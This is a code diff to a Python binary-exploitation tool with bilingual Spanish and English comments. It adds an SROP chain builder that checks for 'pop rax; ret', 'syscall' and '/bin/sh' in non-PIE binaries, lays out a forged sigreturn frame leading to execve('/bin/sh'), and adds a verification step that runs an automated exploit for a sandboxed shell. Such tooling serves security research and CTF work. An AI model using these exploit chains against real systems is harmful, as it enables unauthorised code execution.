@@ -925,6 +925,44 @@ def analyze_chains(binary: str, reg=None, verify: bool = False, lang: str = "es"
             c.sim_result, c.verified, c.proof = _verify_chain(binary, "canary", f, lang)
         chains.append(c)
 
+    # 11b) SROP: binario no-PIE pobre en gadgets con `pop rax; ret` + un gadget `syscall` + una
+    # cadena '/bin/sh'. Un rt_sigreturn (RAX=15) restaura TODO el banco de registros desde un frame
+    # forjado -> execve('/bin/sh',0,0), sin necesitar pop rdi/rsi/rdx. Ruta natural cuando la
+    # cadena execve normal no puede fijar los registros de argumentos.
+    _g_rax = _best_for(gadgets, "rax")
+    _g_sys = next((g for g in gadgets if g.kind == "syscall"), None)
+    if (not f.get("pie") and f.get("win") is None and f.get("binsh") is not None
+            and _g_rax and _g_sys):
+        c = ExploitChain(name="SROP", target="execve('/bin/sh',0,0) via sigreturn")
+        c.requirements = [
+            _req(rip, "control de RIP", "RIP control", lang),
+            _req(bool(_g_rax), "gadget `pop rax; ret` (RAX=15 sigreturn / 59 execve)",
+                 "gadget `pop rax; ret` (RAX=15 sigreturn / 59 execve)", lang),
+            _req(bool(_g_sys), "gadget `syscall`", "gadget `syscall`", lang),
+            _req(f.get("binsh") is not None, "cadena '/bin/sh' en el binario (direccion fija, no-PIE)",
+                 "'/bin/sh' string in the binary (fixed address, no-PIE)", lang)]
+        c.regs_needed = ["rax"]
+        c.gadgets_used = [g.addr for g in (_g_rax, _g_sys) if g]
+        c.mitigations, c.break_points = _mitig_breakpoints(f, True, lang)
+        c.steps = [
+            ChainStep("vuln", ovf, L("controla la direccion de retorno", "controls the return address")),
+            ChainStep("gadget", "pop rax; ret",
+                      (_g_rax.text if _g_rax else L("AUSENTE", "ABSENT")),
+                      addr=_g_rax.addr if _g_rax else None, regs={"rax": "15 (rt_sigreturn)"}),
+            ChainStep("gadget", "syscall",
+                      L("rt_sigreturn: el kernel restaura TODO el frame sigcontext desde la pila",
+                        "rt_sigreturn: the kernel restores the WHOLE sigcontext frame from the stack"),
+                      addr=_g_sys.addr if _g_sys else None),
+            ChainStep("target", "execve('/bin/sh',0,0)",
+                      L("el frame forjado fija RAX=59, RDI=&'/bin/sh', RSI=RDX=0, RIP=syscall",
+                        "the forged frame sets RAX=59, RDI=&'/bin/sh', RSI=RDX=0, RIP=syscall"),
+                      regs={"rax": "59", "rdi": "&'/bin/sh'", "rsi": "0", "rdx": "0"})]
+        _apply_badchars(c, [g.addr for g in (_g_rax, _g_sys) if g] + [f.get("binsh")], _badset, _sink, lang)
+        _score(c)
+        if verify and _should_attempt_verify(c, f):
+            c.sim_result, c.verified, c.proof = _verify_chain(binary, "srop", f, lang)
+        chains.append(c)
+
     # 12) ret2dlresolve: dinamico no-PIE, Partial RELRO, SIN win()/system() ni leak. Se forjan las
     # estructuras del enlazador dinamico (Elf64_Rela/Sym/Str) para que resuelva y llame a
     # system('/bin/sh') sin fugar libc. No aplica a estaticos (no hay resolver) ni a Full RELRO
@@ -1129,6 +1167,22 @@ def _verify_chain(binary: str, kind: str, facts: dict, lang: str):
                 if m:
                     proof["offset" if key == "off" else key] = m.group(1)
             return ((f"{OK} (ret2libc con fuga de libc: base={proof.get('base')}, shell en sandbox)" if v
+                     else f"{NO}: {r.get('note', '')}"), v, proof if v else {})
+        if kind == "srop":
+            from .autosrop import autosrop
+            r = autosrop(binary)
+            v = bool(r.get("verified"))
+            detail = r.get("detail", "") or ""
+            proof = {"strategy": "SROP (sigreturn -> execve)", "marker": "BINORACLE_SROP_PWNED",
+                     "output": (r.get("output", "") or "")[-300:]}
+            for key in ("syscall", "binsh"):
+                m = _re_cv.search(rf"{key}=(0x[0-9a-fA-F]+)", detail)
+                if m:
+                    proof[key] = m.group(1)
+            m = _re_cv.search(r"off=(\d+)", detail)
+            if m:
+                proof["offset"] = int(m.group(1))
+            return ((f"{OK} (SROP: rt_sigreturn restaura el frame forjado -> execve('/bin/sh'), shell en sandbox)" if v
                      else f"{NO}: {r.get('note', '')}"), v, proof if v else {})
         if kind == "dlresolve":
             from .autodlresolve import autodlresolve
